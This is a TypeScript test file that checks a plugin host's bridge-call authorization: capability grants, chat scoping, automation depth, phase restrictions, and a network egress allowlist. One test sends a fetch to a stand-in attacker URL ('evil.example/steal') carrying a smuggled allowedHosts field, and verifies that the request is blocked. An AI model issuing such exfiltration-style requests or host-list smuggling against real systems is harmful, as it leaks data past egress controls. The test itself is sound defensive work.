import type { InvocationChat, PluginCapability } from "@orb/contracts/plugin";
import type { ChatId } from "@orb/kit/ids";
import { vi } from "vitest";
import { __setEgressResolverForTest } from "../../../../packages/server/src/infra/network/egress.ts";
import type { BridgeAuthority } from "../../../../packages/server/src/infra/plugin-host/bridge-rpc.ts";
import { authorizeBridgeCall, authorizeSyncCall, dispatchBridgeCall } from "../../../../packages/server/src/infra/plugin-host/bridge-rpc.ts";
import type { PluginEgressBridge } from "../../../../packages/server/src/infra/plugin-host/net-egress.ts";
import { createPluginNetEgress } from "../../../../packages/server/src/infra/plugin-host/net-egress.ts";
import { isBridgeOperation } from "../../../../packages/server/src/infra/plugin-host/process-protocol.ts";
import { expect, test } from "../../../support/fixtures.ts";

const CHAT = "chat_authorized00000000000000" as ChatId;
const OTHER_CHAT = "chat_other00000000000000000" as ChatId;

function authority(
  grants: readonly PluginCapability[],
  chat: InvocationChat | null = null,
  phase: "activation" | "rehydration" | "invocation" | "snippet" | "lifecycle" = "invocation",
): BridgeAuthority {
  return { grants: new Set(grants), chat, phase };
}

test("parent authority rejects an absent grant and a chat outside the admitted invocation", () => {
  expect(() => authorizeBridgeCall(authority([], { chatId: CHAT, canWrite: true, automationDepth: 0 }), "chat.listMessages", [CHAT, 10])).toThrow(
    /lacks capability chat\.read/u,
  );
  expect(() =>
    authorizeBridgeCall(authority(["chat.read"], { chatId: CHAT, canWrite: true, automationDepth: 0 }), "chat.listMessages", [OTHER_CHAT, 10]),
  ).toThrow(/outside the admitted invocation chat/u);
  expect(() => authorizeBridgeCall(authority(["chat.read"], { chatId: CHAT, canWrite: true, automationDepth: 0 }), "chat.listMessages", [])).toThrow(
    /malformed arguments/u,
  );
});

test("parent authority rechecks host-only writes and cascade depth", () => {
  expect(() =>
    authorizeBridgeCall(authority(["turn.trigger"], { chatId: CHAT, canWrite: false, automationDepth: 2 }), "chat.requestTurn", [CHAT, 3, {}]),
  ).toThrow(/requires host authority/u);
  expect(() =>
    authorizeBridgeCall(authority(["turn.trigger"], { chatId: CHAT, canWrite: true, automationDepth: 2 }), "chat.requestTurn", [CHAT, 2, {}]),
  ).toThrow(/stale automation depth/u);
  expect(() =>
    authorizeBridgeCall(authority(["turn.trigger"], { chatId: CHAT, canWrite: true, automationDepth: 2 }), "chat.requestTurn", [CHAT, 3, {}]),
  ).not.toThrow();
});

test("suggestions require the matching grant and the non-host posture they represent", () => {
  const act = { kind: "requestTurn", automationDepth: 1 };
  expect(() => authorizeBridgeCall(authority([], { chatId: CHAT, canWrite: false, automationDepth: 0 }), "suggest", [CHAT, act])).toThrow(
    /lacks capability turn\.trigger/u,
  );
  expect(() => authorizeBridgeCall(authority(["turn.trigger"], { chatId: CHAT, canWrite: true, automationDepth: 0 }), "suggest", [CHAT, act])).toThrow(
    /cannot replace standing host authority/u,
  );
  expect(() => authorizeBridgeCall(authority(["turn.trigger"], { chatId: CHAT, canWrite: false, automationDepth: 0 }), "suggest", [CHAT, act])).not.toThrow();
});

test("broker egress calls keep their original grants, one capability each", () => {
  expect(() => authorizeBridgeCall(authority([]), "net.fetch", ["https://api.allowed.test/x", null])).toThrow(/lacks capability net\.fetch$/u);
  expect(() => authorizeBridgeCall(authority(["net.fetch_asset"]), "net.fetch", ["https://api.allowed.test/x", null])).toThrow(/lacks capability net\.fetch$/u);
  expect(() => authorizeBridgeCall(authority(["net.fetch"]), "net.fetchAsset", ["https://api.allowed.test/x.png"])).toThrow(
    /lacks capability net\.fetch_asset/u,
  );
  expect(() => authorizeBridgeCall(authority(["net.fetch"]), "net.fetch", ["https://api.allowed.test/x", null])).not.toThrow();
  expect(() => authorizeBridgeCall(authority(["net.fetch_asset"]), "net.fetchAsset", ["https://api.allowed.test/x.png"])).not.toThrow();
});

test("the broker can no longer claim an egress belt or store bytes it fetched itself", () => {
  expect(isBridgeOperation("assets.storeFetched")).toBe(false);
  expect(isBridgeOperation("admitEgress")).toBe(false);
  expect(isBridgeOperation("admitAssetEgress")).toBe(false);
});

test("a broker fetch is walled by the app's own netHosts; the frame carries no host list to widen it", async () => {
  let admitted = 0;
  const egressBridge = {
    admitEgress: (): void => {
      admitted += 1;
    },
    admitAssetEgress: (): void => undefined,
    assets: { storeFetched: () => Promise.reject(new Error("test: no asset is stored here")) },
  } satisfies PluginEgressBridge;
  const target = {
    // @orb-waive no-test-fabrication(never): dispatch of the net ops reaches only `netEgress`; the domain bridge is never dereferenced, so any touch throws. Ends when this deliberate test boundary can be expressed without a fabricated typed value.
    bridge: {} as never,
    netEgress: createPluginNetEgress(["api.allowed.test"], egressBridge),
  };
  const liveness = { aborted: false, onAbort: () => (): void => undefined };
  // A regressed wall must fail here, not resolve real DNS or dial out.
  let transported = 0;
  __setEgressResolverForTest(() => Promise.resolve(["93.184.216.34"]));
  vi.stubGlobal("fetch", () => {
    transported += 1;
    return Promise.reject(new Error("test: the transport was reached"));
  });
  try {
    // An extra host list riding the init is inert data: only GET/POST, string headers and a string body survive.
    await expect(
      dispatchBridgeCall(target, "net.fetch", ["https://evil.example/steal", { allowedHosts: ["evil.example"], method: "GET" }], liveness),
    ).rejects.toMatchObject({ name: "EgressBlockedError", reason: "host-not-allowed" });
    expect(admitted).toBe(1);
    expect(transported).toBe(0);
    await expect(dispatchBridgeCall(target, "net.fetch", ["https://api.allowed.test/x"], liveness)).rejects.toThrow(/malformed arguments/u);
    await expect(dispatchBridgeCall(target, "net.fetchAsset", [42], liveness)).rejects.toThrow(/malformed arguments/u);
  } finally {
    vi.unstubAllGlobals();
    __setEgressResolverForTest(null);
  }
});

test("rehydration permits catalog reads but refuses effects and egress before dispatch", () => {
  expect(() => authorizeBridgeCall(authority(["storage.kv"], null, "rehydration"), "storage.get", ["setting"])).not.toThrow();
  expect(() => authorizeBridgeCall(authority(["storage.kv"], null, "rehydration"), "storage.set", ["setting", "changed"])).toThrow(
    /unavailable while rebuilding/u,
  );
  expect(() => authorizeBridgeCall(authority(["ui.surface"], null, "rehydration"), "ui.setState", ["panel", {}, null])).toThrow(
    /unavailable while rebuilding/u,
  );
  expect(() => authorizeBridgeCall(authority(["net.fetch"], null, "rehydration"), "net.fetch", ["https://api.allowed.test/x", null])).toThrow(
    /unavailable while rebuilding/u,
  );
  expect(() => authorizeSyncCall(authority([], null, "rehydration"), "seam.mintId")).toThrow(/unavailable while rebuilding/u);
  expect(() => authorizeSyncCall(authority([], null, "rehydration"), "seam.nowEpochMs")).not.toThrow();
});

test("lifecycle teardown authority cannot dispatch a late guest call", () => {
  expect(() => authorizeBridgeCall(authority(["storage.kv"], null, "lifecycle"), "storage.get", ["key"])).toThrow(/lifecycle teardown/u);
  expect(() => authorizeSyncCall(authority([], null, "lifecycle"), "seam.nowEpochMs")).toThrow(/lifecycle teardown/u);
});
